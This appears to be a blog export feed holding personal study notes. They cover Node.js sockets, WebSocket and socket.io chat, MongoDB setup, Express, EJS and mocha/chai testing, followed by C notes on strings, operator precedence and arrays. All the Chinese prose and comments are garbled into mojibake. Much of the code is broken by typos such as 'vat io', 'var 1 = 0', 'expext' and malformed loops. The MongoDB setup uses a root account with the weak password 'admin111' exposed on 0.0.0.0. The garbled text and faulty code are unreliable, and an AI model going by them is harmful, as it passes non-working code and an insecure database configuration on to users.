'127.0.0.1' var client = new net.Socket() client.setEncoding = 'UTF-8' //è¿æ¥æœåŠ¡å™¨ client.connect(port, host, function () { client.write("æ‚¨å¥½") }) //ç›‘å¬æœåŠ¡ç«¯æ¶ˆæ¯ client.on('data', function (data) { console.log("æœåŠ¡ç«¯ä¼ æ¥ï¼š" + data); say() }) client.on('error', function (err){ console.log(err); }) client.on('close', function (err){ console.log('connection closed'); }) const readline = require('readline') const r1 = readline.createInterface({ input: process.stdin, //æ ‡å‡†è¾“å…¥ output: process.stdout }) function say() { r1.question('è¯·è¾“å…¥ï¼š', (inputStr => { if (inputStr != 'bye'){ client.write(inputStr + '\n') }else{ client.distory() //å…³é—­è¿æ¥ r1.close() } })) } 2). æµè§ˆå™¨åŸç”Ÿæ”¯æŒçš„WebSocketnpm install ws æ¡ˆä¾‹åŒä¸Š server.js var wbsocketServer = require('ws').Server, wss = new wbsocketServer({port:9001}) var clientMap = new Object() var i=0 wss.on('connection', function (ws){ ws.name = ++i clientMap[ws.name] = ws console.log(ws.name + " ä¸Šçº¿äº†"); ws.on('message', function (message){ broadcast(message, ws) }) ws.on('close', function (message){ // global.gc() //è°ƒç”¨å†…å­˜å›æ”¶ console.log(ws + " ç¦»å¼€"); }) }) //å¹¿æ’­æ–¹æ³• function broadcast(msg, ws){ for(var key in clientMap){ clientMap[key].send(ws.name + 'è¯´ï¼š' + msg) } } client.js var WebSocket = require('ws') var ws = new WebSocket('ws://127.0.0.1:9001/') ws.onopen = function () { ws.send('å¤§å®¶å¥½') } ws.onmessage = function (event) { var chatroom = document.getElementById('chatroom') chatroom.innerHtml += '&lt;/br>' + event.data } ws.onclose = function () { alert('Closed') } ws.onerror = function (err) { alert('Error:' + err) } chat.html &lt;body> &lt;div id="chatroom">&lt;/div> &lt;input type="text" name="sayinput" id="sayinput" value=""> &lt;input type="button" name="send" id="sendbutton" value="å‘é€"> &lt;script src="client.js">&lt;/script> &lt;script type="text/javascript"> function send(){ ws.send(sayinput.value) sayinput.vaule = "" } document.onkeyup = function(event){ if (event.keycode == 13){ send() } } sendbutton.onclick = function (){ send() } &lt;/script> &lt;/body> 3). socket.ioå®ç°socketå½“æµè§ˆå™¨ä¸æ”¯æŒhtml5æ—¶ï¼Œå°±ä¸èƒ½ç”¨websocketäº† å€ŸåŠ©expresså®ç°: npm i express socket.io socket_io.js var app = require('express')() var http = require('http').Server(app) vat io = require('socket.io')(http) var fs = require('fs') app.get('/', (req,res)=>{ function callback(data) { res.send(data.toString()) } fs.readFile('socketIOClient.html', function (err, data){ if(err){ console.log(err); console.log("æ–‡ä»¶ä¸å­˜åœ¨"); }else{ callback(data) } }) }) // app.get('/socket.io.js') //socket.ioçš„è®¾ç½® //åœ¨çº¿ç”¨æˆ· var onlineUsers = {} //åœ¨çº¿äººæ•° var onlineCount = 0 var 1 = 0 io.on('connection', function (socket){ console.log("æœ‰äººä¸Šçº¿äº†"); //ç›‘å¬æ–°ç”¨æˆ·åŠ å…¥ socket.name = i onlineUsers[socket.name] = socket //ç›‘å¬ç”¨æˆ·é€€å‡º socket.on('disconnect', function (){ console.log("æœ‰äººé€€å‡ºäº†"); delete onlineUsers[socket.name] }) //ç›‘å¬ç”¨æˆ·å‘å¸ƒçš„èŠå¤©å†…å®¹ socket.on('message', function (msg){ broadcast(msg, socket) }) }) //å¹¿æ’­æ–¹æ³• function broadcast(msg, socket){ for(var key in onlineUsers){ onlineUsers[key].send(socket.name + 'è¯´ï¼š' + msg) } } http.listen(9002, function (){ console.log(""); }) html &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset="utf-8"> &lt;title>&lt;/title> &lt;style> #chatroom{ width:400px; height:600px; overflow:auto; border:1px solid bule } &lt;/style> &lt;script src="./socket.io.js">&lt;/script> &lt;/head> &lt;body> &lt;script type="text/javascript"> var iosocket = null; windows.onload = function (){ iosocket = io.connect('http://127.0.0.1/9002') iosocket.on('connect'. function (){ iosocket.send('hello, from inclient') }) //æ¥æ”¶æ•°æ® iosocket.on('message', function (message){ var chatroom = document.getElementById("chatroom"); chatroom.innerHtml += message = '&lt;/br>' }) //æ–­å¼€è¿æ¥ iosocket.on('disconnect', function (){ console.log("æœåŠ¡ç«¯å…³é—­"); }) function send(){ iosocket.send(sayinput.value) sayinput.value = "''" } document.onkeyup = function(event){ if (event.keycode == 13){ send() } } sendbutton.onclick = function (){ send() } } &lt;/script> &lt;div id="chatroom">&lt;/div> &lt;input type="text" name="sayinput" id="sayinput" value=""> &lt;input type="button" name="send" id="sendbutton" value="å‘é€"> &lt;/body> &lt;/html> ä¸ƒ.MongoDBå®‰è£…(Linuxä¸‹)1. é€šè¿‡å…¬é’¥å¯¹èµ„æºåŒ…ä¸€è‡´æ€§å’ŒçœŸå®æ€§è¿›è¡ŒéªŒè¯ï¼š sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4 2. è¿è¡Œä¸‹è¡Œå‘½ä»¤ï¼Œåˆ›å»ºæ–‡ä»¶/etc/apt/sources.list.d/mongodb-org-4.0.listï¼š echo "deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list 3. åœ¨å®‰è£…ä¹‹å‰ï¼Œå…ˆæ›´æ–°ç³»ç»Ÿèµ„æºåŒ…ï¼š sudo apt-get update 4. å®‰è£…mongodbèµ„æºåŒ…ï¼š # å®‰è£…MongoDB server sudo apt-get install -y mongodb-org # å®‰è£…MongoDB å®¢æˆ·ç«¯ sudo apt-get install mongodb-clients 4. æ£€éªŒæ˜¯å¦å®‰è£…æˆåŠŸï¼š å¯åŠ¨mongodæœåŠ¡ï¼š sudo service mongod start #æŸ¥çœ‹mongoç‰ˆæœ¬: mongo --version 5.ç™»å½•MongoDBå¹¶è®¾ç½®å¯†ç  # ç™»å½• mongo # åˆ‡æ¢åˆ°adminæ•°æ®åº“ use admin # åˆ›å»ºadminè´¦å·ï¼Œå¯†ç ::admin111 æƒé™ï¼šrootæƒé™ï¼Œæˆæƒçš„æ•°æ®åº“åï¼šadmin db.createUser({user:"admin", pwd:"admin111", roles:[{role:"root", db:"admin"}]}) ç¼–è¾‘MongoDBé…ç½®æ–‡ä»¶ vim /etc/mongod.conf net: port: 27017 # ç«¯å£ bindIp: 0.0.0.0 # å…è®¸è®¿é—®çš„åœ°å€ï¼Œ0.0.0.0è¡¨ç¤ºæ‰€æœ‰ security: authorization: enabled é‡å¯MongoDBæœåŠ¡ systemctl restart mongod.service æµ‹è¯•ç™»å½• mongo -u admin -p admin111 --authenticationDatabase admin å­¦ä¹  ä¸mysqlè¯­æ³•å¯¹æ¯”ï¼šhttps://www.jb51.net/article/65626.htm?tdsourcetag=s_pctim_aiomsg æœ¯è¯­ã€æ¦‚å¿µ MongoDBé›†åˆ ä¸€ä¸ªæ•°æ®åº“å¯ä»¥æœ‰å¤šä¸ªé›†åˆ(å¯¹åº”mysqlçš„table) MongoDBæ–‡æ¡£ é”®å€¼å¯¹ å¦‚ï¼š{'name':'xps', 'like':['code','play']} MongoDBæ•°æ®ç±»å‹ å¸¸ç”¨å‘½ä»¤1.æ•°æ®åº“æ“ä½œæŸ¥çœ‹å¸®åŠ© help db.help() db.test.help() df.test.find().help() åˆ›å»º/åˆ‡æ¢æ•°æ®åº“ use music # å¦‚æœä¸å­˜åœ¨å°±åˆ›å»ºï¼Œå­˜åœ¨ä¸”åˆ‡æ¢ æŸ¥è¯¢æ•°æ®åº“ show dbs # å½“æ•°æ®åº“ä¸ºç©ºæ—¶ï¼Œæ˜¯ä¸æ˜¾ç¤ºçš„ # æˆ‘ä»¬å‘ä¸€ä¸ªé›†åˆé‡Œé¢æ’å…¥ä¸€ä¸ªæ–‡æ¡£ db.user.insertOne({'name':'xps','like':['code','play']}) # æŸ¥çœ‹é›†åˆé‡Œé¢çš„æ–‡æ¡£(è¡Œ) db.user.find() æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ db # db.getName() æ˜¾ç¤ºå½“å‰DBçŠ¶æ€ db.stats() æŸ¥çœ‹å½“å‰DBç‰ˆæœ¬ db.version() æŸ¥çœ‹å½“å‰DBçš„é“¾æ¥æœºå™¨åœ°å€ db.getMongo() åˆ é™¤æ•°æ®åº“ db.dropDatabase() 2.é›†åˆï¼ˆCollectionï¼‰æ“ä½œâ€¦.å†™äº†åŠå¤©ï¼Œå¿˜äº†ä¿å­˜ï¼Œç®—äº†ï¼Œæ”¾å›¾ç‰‡å§â€¦. 3.æ–‡æ¡£æ“ä½œå¯¹é›†åˆå†…æ•°æ®å¢åˆ æ”¹æŸ¥ åˆ é™¤ db.user.remove({'name':'xps'}) db.user.delete({'name':'xps'}) db.user.deleteMany({'name':'xps'}) å…«. Expressæ¡†æ¶ ä¸€ä¸ªnode.jsçš„webæ¡†æ¶ 1). å‡†å¤‡å®‰è£… npm install express --save, Windowsä¸‹è¿˜æœ‰:npm install -g express-generator express -h æµ‹è¯•å®‰è£…æˆåŠŸ æ–°å»ºé¡¹ç›®ï¼šexpress test_express ç›®å½•ç»“æ„ï¼š package.jsæ˜¯éœ€è¦çš„ä¾èµ–ï¼Œåˆ‡æ¢åˆ°é¡¹ç›®æ ¹ç›®å½•æ‰‹åŠ¨å®‰è£…npm install app.jsæ˜¯å…¥å£ www/binä¸‹é¢æ˜¯ç«¯å£ç­‰é…ç½® å¯åŠ¨é¡¹ç›®ï¼š npm start 2). Expressåˆå§‹åŒ–é¡¹ç›®è¯¦è§£ä¸€äº›æ¨¡å— "dependencies": { //"body-parser": "~1.15.2", // è§£æå‰ç«¯æäº¤çš„æ•°æ® "cookie-parser": "~1.4.4", //è§£æcookie "debug": "~2.6.9", // ç”¨æ¥æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ //"ejs": "~2.5.2", //æ¨¡æ¿ï¼Œæ¸²æŸ“é¡µé¢ "express": "~4.16.1", "http-errors": "~1.6.3", "jade": "~1.11.0", //æ¨¡æ¿ï¼Œæ¸²æŸ“é¡µé¢ "morgan": "~1.9.1" //æ—¥å¿—ï¼Œæ§åˆ¶åæ ¼å¼åŒ–æ˜¾ç¤ºä¿¡æ¯ } bin/wwwå…¥å£æ–‡ä»¶ å®ç°äº†åˆ›å»ºæœåŠ¡å’Œä¸­é—´ä»¶ã€è·¯ç”±é…ç½® normalizePort() æ–¹æ³•ï¼Œå¯¹ç«¯å£è¿›è¡Œç®€å•å¤„ç† 1.è·¯ç”±ä¸­é—´ä»¶ 2.è‡ªå®šä¹‰ä¸­é—´ä»¶ï¼ˆapp.set('port', port)è¿™æ ·ï¼‰ app.use() app.js app.use(express.static(path.join(__dirname, 'public'))); //è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„ ... var usersRouter = require('./routes/users'); app.use('/users', usersRouter); router/xxx.js è·¯ç”±çš„ä¸­é—´ä»¶ //è¿™é‡Œçš„indexå°±æ˜¯viewä¸‹é¢çš„index.jade res.render('index', { title: 'Express' }); //æ¸²æŸ“æ¨¡æ¿ ï¼Œ indexä¸ç”¨å†™åç¼€å #æ¯”å¦‚ index.js var express = require('express'); var router = express.Router(); // get('/', xxx) å› ä¸ºå‰é¢å†™äº†/userï¼Œæ‰€ä»¥è¿™é‡Œåªå†™/å³å¯ router.get('/', function(req, res, next) { res.send('respond with a resource'); }); module.exports = router; // æš´éœ²å‡ºå»ï¼Œæ‰èƒ½ä»¥ä¸­é—´ä»¶çš„å½¢å¼å­˜åœ¨ views/xxx.jade æ¨¡æ¿æ–‡ä»¶ 3). Expressä¸­çš„è·¯ç”±users.js var express = require('express'); var router = express.Router(); /* GET users listing. */ router.get('/', function(req, res, next) { res.send('respond with a resource'); }); // ç¬¬äºŒå±‚è·¯ç”±ï¼Œç¬¬ä¸€å±‚åœ¨app.jsé‡Œ router.get('/list', function(req, res) { res.send('user list'); }); // å¯ä»¥å†™æˆè¡¨è¾¾å¼ï¼ˆæ­£åˆ™ï¼‰ router.get('/a*d', function(req, res) { res.send('è¡¨è¾¾å¼è·¯ç”±'); }); //è½¬åˆ°ä¸€ä¸ªæ–‡ä»¶ router.get('/form', function(req, res) { res.sendFile(__dirname + '/form.html') }); //postè¯·æ±‚ router.post('/save', function(req, res) { res.send("è¡¨å•æäº¤!") }); // allï¼Œ postå’Œgetéƒ½æ¥æ”¶ router.all('/all',function(req, res) { res.send("postå’Œgetéƒ½æ¥æ”¶!") }); module.exports = router; form.html &lt;form action="/users/save" method="post" class="formClass"> &lt;label for="username"> username: &lt;input type="text" name="username" value=""/> &lt;/label> &lt;label for="submit"> &lt;input type="submit" value="æäº¤" /> &lt;/label> &lt;/form> 4). Expressä¸­çš„æ¨¡æ¿ejs/jadeç­‰ ejsæ¯”è¾ƒç®€å• #å®‰è£…ï¼ˆexpresså†…ç½®äº†ejsï¼‰ npm install ejs --save #é…ç½®ejsæ¨¡æ¿å¼•æ“ app.set('view engine','ejs') #æ¸²æŸ“é¡µé¢ render(filename,json)æ¥æ”¶ä¸¤ä¸ªå‚æ•°ã€‚ #å¦‚ä¸‹ app.get('/learnejs',function(req,res){ let arr=['åƒé¥­','ç¡è§‰','æ‰“è±†è±†'] res.render('index',{ list_a:arr }) }) #index.ejs &lt;ul> &lt;%for(var i=0;i&lt;list_a.length;i++){%> &lt;li>&lt;%=list[i]%>&lt;!--%=list[i]%-->&lt;/li> &lt;%}%> &lt; ul> &lt; code>&lt;!--%}%>--> æ¸²æŸ“é¡µé¢ # render(filename,json)æ¥æ”¶ä¸¤ä¸ªå‚æ•°ã€‚ å¸¸ç”¨æ ‡ç­¾ &lt;% %> æµç¨‹æ§åˆ¶æ ‡ç­¾ &lt;%= %> è¾“å‡ºæ ‡ç­¾ï¼ˆåŸæ–‡è¾“å‡ºhtmlæ ‡ç­¾ï¼‰ &lt;%- %> è¾“å‡ºæ ‡ç­¾ï¼ˆhtmlä¼šè¢«æµè§ˆå™¨è§£æï¼‰ &lt;%# %> æ³¨é‡Šæ ‡ç­¾ % å¯¹æ ‡è®°è¿›è¡Œè½¬ä¹‰ includes,åœ¨ä¸€ä¸ªæ¨¡æ¿é‡Œé¢å¼•ç”¨å¦ä¸€ä¸ªæ¨¡æ¿ &lt;%- include("æ¨¡æ¿è·¯å¾„", {user:"ä¼ é€’çš„å‚æ•°å†…å®¹"}) %> ä¹.mocha å‰ç«¯æµ‹è¯•æ¡†æ¶ æµè§ˆå™¨å’ŒNodeç¯å¢ƒéƒ½å¯ä½¿ç”¨ å®‰è£…ï¼š # å®‰è£… npm install mocha -g #å‘½ä»¤ mocha #æœ¬åœ°å®‰è£… npm install mocha -D # ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­testå‘½ä»¤ "test": "......./bin/mocha" # è¿è¡Œ npm test åŸºæœ¬ç”¨æ³•å®šä¹‰æµ‹è¯•ï¼š åˆ›å»ºä¸€ä¸ªjsæ–‡ä»¶ describe("Demo", function (){ describe("æ–¹æ³•1", function (){ before(function (){ //æµ‹è¯•ä¹‹å‰åšçš„å†…å®¹ console.log("---æµ‹è¯•ä¹‹å‰åšçš„å†…å®¹") }) after(function (){ //æµ‹è¯•ä¹‹ååšçš„å†…å®¹ console.log("---æµ‹è¯•ä¹‹å‰ååšçš„å†…å®¹") }) beforeEach(function (){ //æ¯æ¡æµ‹è¯•ä¹‹å‰åšçš„å†…å®¹ console.log("---æ¯æ¡æµ‹è¯•ä¹‹å‰åšçš„å†…å®¹") }) context("æƒ…æ™¯1", function (){ it("æµ‹è¯•1", function (){ }) it("æµ‹è¯•2", function (){ }) }) }) }) mocha æ¥å¯åŠ¨æµ‹è¯•/ æˆ–ä½¿ç”¨æœ¬åœ°å®‰è£…çš„mochaæ¥æµ‹è¯•npm test assertæ–­è¨€ä½¿ç”¨åº“ï¼šchai chai: æ–­è¨€åº“ chai: shouldåˆ†å‰²çš„æ–­è¨€ chaiï¼šexpecté£æ ¼çš„æ–­è¨€ å®‰è£…åˆ°æœ¬åœ°ï¼šnpm install chai -D ä½¿ç”¨ const chai = require('chai') const assert = chai.assert describe('Demo', function (){ it("ä½¿ç”¨ asserté£æ ¼çš„æ–­è¨€æµ‹è¯•", function (){ var val = 'hello' assert.typeOf(val, 'string') assert.equal('hello') }) }) const chai = require('chai') const sholud = chai.sholud describe('Demo', () => { it("ä½¿ç”¨ sholudé£æ ¼çš„æ–­è¨€æµ‹è¯•", function (){ var val = 'hello' val.sholud.exist val.sholud.be.a('string') val.sholud.equal('hello') val.sholud.not.equal('hello') val.sholud.have.length() //å¤šä¸ªæ¡ä»¶é€»è¾‘ä¸ val.sholud.equal('hello').and.exist.and.be.a('string') }) }) const chai = require('chai') const expect = chai.expect describe('Demo', () => { it("ä½¿ç”¨ expecté£æ ¼çš„æ–­è¨€æµ‹è¯•", function (){ var val = 'hello' var number = 3 expext(number).to.be.at.most(5) expext(number).to.be.at.least(3) expext(number).to.be.at.within(1,8) expect(value).to.exist expect(value).to.be.a('string') expect(value).to.equal('hello') expect(value).to.not.equal('hello') expect(value).to.have.length(5) }) }) è¿è¡Œå¤šä¸ªæµ‹è¯• mocha --recursive # é€’å½’ å¥½äº†ï¼Œå†å­¦å°±è·‘åäº†â€¦â€¦ ğŸ˜„ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cè¯­è¨€çç¢å¤ä¹ ï¼ˆå†…å®¹ç®€å•,ä»…è‡ªå·±çœ‹ï¼‰]]></title>
    <url>%2Fposts%2F37285%2F</url>
    <content type="text"><![CDATA[ç”±äºå¥½ä¹…æ—¶é—´ä¸çœ‹Cäº†ï¼Œå¥½å¤šä¸œè¥¿éƒ½å¿˜äº† æœ¬æ–‡æ˜¯è·Ÿç€éƒæ–Œè€å¸ˆçš„è§†é¢‘åšçš„éšå ‚ç¬”è®°ï¼Œè¯¾ä¸‹ä¹Ÿæ²¡åšæ•´ç†ï¼Œå¹¶ä¸æˆç³»ç»Ÿï¼Œåªæ˜¯ä¸€äº›ç®€å•å †å ï¼Œä¸”ç¼–ç è§„èŒƒéƒ½æ²¡æœ‰ï¼Œçœ‹çœ‹å°±å¥½å“ˆå“ˆ å­—ç¬¦ä¸²char greeting[6] = {'H', 'e', 'l', 'l', 'o', '\0'}; //1 strcpy(s1, s2); å¤åˆ¶å­—ç¬¦ä¸² s2 åˆ°å­—ç¬¦ä¸² s1ã€‚ //2 strcat(s1, s2); è¿æ¥å­—ç¬¦ä¸² s2 åˆ°å­—ç¬¦ä¸² s1 çš„æœ«å°¾ã€‚ //3 strlen(s1); è¿”å›å­—ç¬¦ä¸² s1 çš„é•¿åº¦ã€‚ //4 strcmp(s1, s2); å¦‚æœ s1 å’Œ s2 æ˜¯ç›¸åŒçš„ï¼Œåˆ™è¿”å› 0ï¼›å¦‚æœ s1&lt;s2 åˆ™è¿”å›å°äº 0ï¼›å¦‚æœ s1>s2 åˆ™è¿”å›å¤§äº 0ã€‚ //5 strchr(s1, ch); è¿”å›ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å­—ç¬¦ä¸² s1 ä¸­å­—ç¬¦ ch çš„ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ //6 strstr(s1, s2); è¿”å›ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å­—ç¬¦ä¸² s1 ä¸­å­—ç¬¦ä¸² s2 çš„ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ //strlen ä¸ sizeofçš„åŒºåˆ«ï¼š strlen æ˜¯å‡½æ•° sizeof æ˜¯è¿ç®—æ“ä½œç¬¦ äºŒè€…å¾—åˆ°çš„ç»“æœç±»å‹ä¸º size_tï¼Œå³ unsigned int ç±»å‹ã€‚ sizeof è®¡ç®—çš„æ˜¯å˜é‡çš„å¤§å°ï¼Œä¸å—å­—ç¬¦ \0 å½±å“ï¼› strlen è®¡ç®—çš„æ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œä»¥ \0 ä½œä¸ºé•¿åº¦åˆ¤å®šä¾æ®ã€‚ // 'a' è¡¨ç¤ºæ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œ"a" è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²ç›¸å½“äº 'a'+'\0'; //å­—ç¬¦ä¸²éå† char hi[] = "hello"; for(i==0, i&lt;6,i++) { printf("%c",hi[i]); } è¿ç®—ç¬¦ä¼˜å…ˆçº§nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj ä¼˜å…ˆçº§ è¿ç®—ç¬¦ åç§°æˆ–å«ä¹‰ ä½¿ç”¨å½¢å¼ ç»“åˆæ–¹å‘ è¯´æ˜ 1 [] æ•°ç»„ä¸‹æ ‡ æ•°ç»„å[å¸¸é‡è¡¨è¾¾å¼] å·¦åˆ°å³ () åœ†æ‹¬å· ï¼ˆè¡¨è¾¾å¼ï¼‰/å‡½æ•°å(å½¢å‚è¡¨) . æˆå‘˜é€‰æ‹©ï¼ˆå¯¹è±¡ï¼‰ å¯¹è±¡.æˆå‘˜å -&gt; æˆå‘˜é€‰æ‹©ï¼ˆæŒ‡é’ˆï¼‰ å¯¹è±¡æŒ‡é’ˆ-&gt;æˆå‘˜å 2 - è´Ÿå·è¿ç®—ç¬¦ -è¡¨è¾¾å¼ å³åˆ°å·¦ å•ç›®è¿ç®—ç¬¦ (ç±»å‹) å¼ºåˆ¶ç±»å‹è½¬æ¢ (æ•°æ®ç±»å‹)è¡¨è¾¾å¼ ++ è‡ªå¢è¿ç®—ç¬¦ ++å˜é‡å/å˜é‡å++ å•ç›®è¿ç®—ç¬¦ â€“ è‡ªå‡è¿ç®—ç¬¦ â€“å˜é‡å/å˜é‡åâ€“ å•ç›®è¿ç®—ç¬¦ * å–å€¼è¿ç®—ç¬¦ *æŒ‡é’ˆå˜é‡ å•ç›®è¿ç®—ç¬¦ &amp; å–åœ°å€è¿ç®—ç¬¦ &amp;å˜é‡å å•ç›®è¿ç®—ç¬¦ ! é€»è¾‘éè¿ç®—ç¬¦ !è¡¨è¾¾å¼ å•ç›®è¿ç®—ç¬¦ ~ æŒ‰ä½å–åè¿ç®—ç¬¦ ~è¡¨è¾¾å¼ å•ç›®è¿ç®—ç¬¦ sizeof é•¿åº¦è¿ç®—ç¬¦ sizeof(è¡¨è¾¾å¼) 3 / é™¤ è¡¨è¾¾å¼/è¡¨è¾¾å¼ å·¦åˆ°å³ åŒç›®è¿ç®—ç¬¦ * ä¹˜ è¡¨è¾¾å¼*è¡¨è¾¾å¼ åŒç›®è¿ç®—ç¬¦ % ä½™æ•°ï¼ˆå–æ¨¡ï¼‰ æ•´å‹è¡¨è¾¾å¼/æ•´å‹è¡¨è¾¾å¼ åŒç›®è¿ç®—ç¬¦ 4 + åŠ  è¡¨è¾¾å¼+è¡¨è¾¾å¼ å·¦åˆ°å³ åŒç›®è¿ç®—ç¬¦ - å‡ è¡¨è¾¾å¼-è¡¨è¾¾å¼ åŒç›®è¿ç®—ç¬¦ 5 &lt;&lt; å·¦ç§» å˜é‡&lt;&lt;è¡¨è¾¾å¼ å·¦åˆ°å³ åŒç›®è¿ç®—ç¬¦ &gt;&gt; å³ç§» å˜é‡&gt;&gt;è¡¨è¾¾å¼ åŒç›®è¿ç®—ç¬¦ 6 &gt; å¤§äº è¡¨è¾¾å¼&gt;è¡¨è¾¾å¼ å·¦åˆ°å³ åŒç›®è¿ç®—ç¬¦ &gt;= å¤§äºç­‰äº è¡¨è¾¾å¼&gt;=è¡¨è¾¾å¼ åŒç›®è¿ç®—ç¬¦ &lt; å°äº è¡¨è¾¾å¼&lt;è¡¨è¾¾å¼ åŒç›®è¿ç®—ç¬¦ &lt;= å°äºç­‰äº è¡¨è¾¾å¼&lt;=è¡¨è¾¾å¼ åŒç›®è¿ç®—ç¬¦ 7 == ç­‰äº è¡¨è¾¾å¼==è¡¨è¾¾å¼ å·¦åˆ°å³ åŒç›®è¿ç®—ç¬¦ != ä¸ç­‰äº è¡¨è¾¾å¼!= è¡¨è¾¾å¼ åŒç›®è¿ç®—ç¬¦ 8 &amp; æŒ‰ä½ä¸ è¡¨è¾¾å¼&amp;è¡¨è¾¾å¼ å·¦åˆ°å³ åŒç›®è¿ç®—ç¬¦ 9 ^ æŒ‰ä½å¼‚æˆ– è¡¨è¾¾å¼^è¡¨è¾¾å¼ å·¦åˆ°å³ åŒç›®è¿ç®—ç¬¦ 10 \ æŒ‰ä½æˆ– è¡¨è¾¾å¼\ è¡¨è¾¾å¼ å·¦åˆ°å³ åŒç›®è¿ç®—ç¬¦ 11 &amp;&amp; é€»è¾‘ä¸ è¡¨è¾¾å¼&amp;&amp;è¡¨è¾¾å¼ å·¦åˆ°å³ åŒç›®è¿ç®—ç¬¦ 12 \ \ é€»è¾‘æˆ– è¡¨è¾¾å¼\ \ è¡¨è¾¾å¼ å·¦åˆ°å³ åŒç›®è¿ç®—ç¬¦ 13 ?: æ¡ä»¶è¿ç®—ç¬¦ è¡¨è¾¾å¼1? è¡¨è¾¾å¼2: è¡¨è¾¾å¼3 å³åˆ°å·¦ ä¸‰ç›®è¿ç®—ç¬¦ 14 = èµ‹å€¼è¿ç®—ç¬¦ å˜é‡=è¡¨è¾¾å¼ å³åˆ°å·¦ /= é™¤åèµ‹å€¼ å˜é‡/=è¡¨è¾¾å¼ *= ä¹˜åèµ‹å€¼ å˜é‡*=è¡¨è¾¾å¼ %= å–æ¨¡åèµ‹å€¼ å˜é‡%=è¡¨è¾¾å¼ += åŠ åèµ‹å€¼ å˜é‡+=è¡¨è¾¾å¼ -= å‡åèµ‹å€¼ å˜é‡-=è¡¨è¾¾å¼ &lt;&lt;= å·¦ç§»åèµ‹å€¼ å˜é‡&lt;&lt;=è¡¨è¾¾å¼ &gt;&gt;= å³ç§»åèµ‹å€¼ å˜é‡&gt;&gt;=è¡¨è¾¾å¼ &amp;= æŒ‰ä½ä¸åèµ‹å€¼ å˜é‡&amp;=è¡¨è¾¾å¼ ^= æŒ‰ä½å¼‚æˆ–åèµ‹å€¼ å˜é‡^=è¡¨è¾¾å¼ \ = æŒ‰ä½æˆ–åèµ‹å€¼ å˜é‡\ =è¡¨è¾¾å¼ 15 , é€—å·è¿ç®—ç¬¦ è¡¨è¾¾å¼,è¡¨è¾¾å¼,â€¦ å·¦åˆ°å³ ä»å·¦å‘å³é¡ºåºè¿ç®— æ³¨ï¼šåŒä¸€ä¼˜å…ˆçº§çš„è¿ç®—ç¬¦ï¼Œè¿ç®—æ¬¡åºç”±ç»“åˆæ–¹å‘æ‰€å†³å®šã€‚ æ•°ç»„main.c #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> // 2.äºŒç»´æ•°ç»„ /** int a[3][4]; æ€»å…±12ä¸ªå…ƒç´ ï¼Œå¯ä»¥å½“åš3è¡Œ4åˆ—çœ‹å¾…ï¼Œä¾æ¬¡æ˜¯: a[0][0],a[0][1],a[0][2],a[0][3] a[1][0],a[1][1],a[1][2],a[1][3] a[2][0],a[2][1],a[2][2],a[2][3] a[i][j] ==> i+1è¡Œï¼Œj+1åˆ—çš„å…ƒç´  int a[m][n]; è¯¥äºŒä½æ•°ç»„çš„å³ä¸‹è§’ä½ç½®çš„å…ƒç´ åªèƒ½æ˜¯a[m-1][n-1] */ void init_double() { //1.æœ€ç¬¨çš„åˆå§‹åŒ– int a[3][4]={1,2,3,4,5,6,7,8,9,10,11,12}; //2.åˆ†å¼€å†™ï¼ˆæ ¼å¼è¦å†™æ­£ç¡®ï¼‰ int b[3][4]={ {1,2,3,4}, {5,6,7,8}, {9,10,11,12} }; //3.å…¶ä»–å„ç§åˆå§‹åŒ– // è¾“å‡ºäºŒç»´æ•°ç»„å†…å®¹ int i, j; for(i=0;i&lt;3;++i) { for(j=0; j&lt;4; ++j) { printf("%-5d \t", b[i][j]); // ä»˜å¥½ï¼šå·¦å¯¹é½ï¼Œ5ä»£è¡¨å 5ä¸ªä½ç½®ï¼ˆè¿™ä¸æ˜¯é‡ç‚¹ï¼Œæ ¼å¼æ§åˆ¶æœ‰å…¶ä»–æ§åˆ¶åŠæ³•ï¼‰ } printf("\n"); // æ ¼å¼åŒ–(æ¯å››ä¸ªä¸€è¡Œ) } // äºŒç»´æ•°ç»„æ’åº //æ±‚æ¯ä¸€è¡Œæœ€å¤§å€¼ // } // å¤šç»´æ•°ç»„ï¼š /* 1. ä¸å­˜åœ¨! å› ä¸ºå†…å­˜æ˜¯çº¿æ€§ä¸€ç»´çš„ 2. nç»´æ•°ç»„å¯ä»¥å½“åš æ¯ä¸ªå…ƒç´ æ˜¯n-1ç»´æ•°ç»„çš„ä¸€ç»´æ•°ç»„ çš„æ•°ç»„ æ¯”å¦‚ï¼ša[3][4]ï¼Œå¯ä»¥å½“åšå«æœ‰ä¸‰ä¸ªå…ƒç´ çš„ä¸€ç»´æ•°ç»„ï¼Œåªä¸è¿‡æ¯ä¸ªå…ƒç´ éƒ½å¯ä»¥åˆ’åˆ†ä¸º4ä¸ªå°å…ƒç´  */ å‡½æ•°func.h #include &lt;stdio.h> int after_func(); // å‡½æ•°çš„å£°æ˜ï¼Œ 